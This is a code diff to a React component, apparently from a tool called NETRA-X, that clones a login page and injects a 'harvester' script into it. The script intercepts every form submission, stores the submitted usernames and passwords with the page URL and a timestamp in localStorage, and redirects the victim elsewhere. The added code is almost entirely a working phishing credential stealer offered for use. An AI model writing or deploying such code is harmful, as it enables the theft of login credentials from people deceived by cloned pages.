@@ -2,8 +2,7 @@
 'use client';
 
 import { useState } from 'react';
-import { useForm, type UseFormReturn } from 'react-hook-form';
-import { zodResolver } from '@hookform/resolvers/zod';
+import { type UseFormReturn } from 'react-hook-form';
 import { z } from 'zod';
 import {
   Card, CardHeader, CardTitle, CardDescription,
@@ -30,8 +29,62 @@ const clonerSchema = z.object({
   path: ['urlToClone'],
 });
 
+const getHarvesterScript = (redirectUrl: string) => `
+<script>
+  function captureAndRedirect(form) {
+    try {
+      const formData = new FormData(form);
+      const credentials = {};
+      let capturedData = false;
+
+      for (let [key, value] of formData.entries()) {
+        if (typeof value === 'string' && value.length > 0) {
+          credentials[key] = value;
+          capturedData = true;
+        }
+      }
+
+      if (capturedData) {
+        const entry = {
+          ...credentials,
+          source: window.location.href,
+          timestamp: new Date().toISOString()
+        };
+        const storageKey = 'netra-captured-credentials';
+        try {
+          const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
+          const updatedData = [...existingData, entry];
+          localStorage.setItem(storageKey, JSON.stringify(updatedData));
+
+          window.dispatchEvent(new StorageEvent('storage', {
+            key: storageKey,
+            newValue: JSON.stringify(updatedData)
+          }));
+        } catch(e) {
+          console.error('NETRA-X Harvester: Could not save to localStorage.', e);
+        }
+      }
+    } catch (e) {
+      console.error('NETRA-X Harvester: Error capturing form data.', e);
+    } finally {
+      setTimeout(() => {
+        window.location.href = '${redirectUrl}';
+      }, 150);
+    }
+  }
+
+  document.addEventListener('submit', function(e) {
+    if (e.target && e.target.tagName === 'FORM') {
+      e.preventDefault();
+      e.stopPropagation();
+      captureAndRedirect(e.target);
+    }
+  }, true);
+</script>
+`;
+
 type LoginPageClonerProps = {
-  onHostPage: (htmlContent: string, redirectUrl: string) => void;
+  onHostPage: (htmlContent: string) => void;
   form: UseFormReturn<z.infer<typeof clonerSchema>>;
 };
 
@@ -75,6 +128,7 @@ export function LoginPageCloner({ onHostPage, form }: LoginPageClonerProps) {
       }
 
       let html = originalHtml;
+      const harvesterScript = getHarvesterScript(values.redirectUrl);
       
       if (baseHrefUrl) {
         if (html.includes('<head>')) {
@@ -82,6 +136,12 @@ export function LoginPageCloner({ onHostPage, form }: LoginPageClonerProps) {
         } else {
           html = `<head><base href="${baseHrefUrl}"></head>${html}`;
         }
+      }
+
+      if (html.includes('</body>')) {
+          html = html.replace(/<\\/body>/i, `${harvesterScript}</body>`);
+      } else {
+          html += harvesterScript;
       }
 
       setModifiedHtml(html);
@@ -168,7 +228,7 @@ export function LoginPageCloner({ onHostPage, form }: LoginPageClonerProps) {
             <CardFooter className="flex-col gap-4">
               <CardTitle className="text-xl">2. Host Page</CardTitle>
               <div className="w-full flex gap-2">
-                <Button type="button" onClick={() => onHostPage(modifiedHtml, form.getValues('redirectUrl'))} disabled={isProcessing} className="w-full">
+                <Button type="button" onClick={() => onHostPage(modifiedHtml)} disabled={isProcessing} className="w-full">
                   <Globe className="mr-2 h-4 w-4" />
                   Host Page & Inject Harvester
                 </Button>
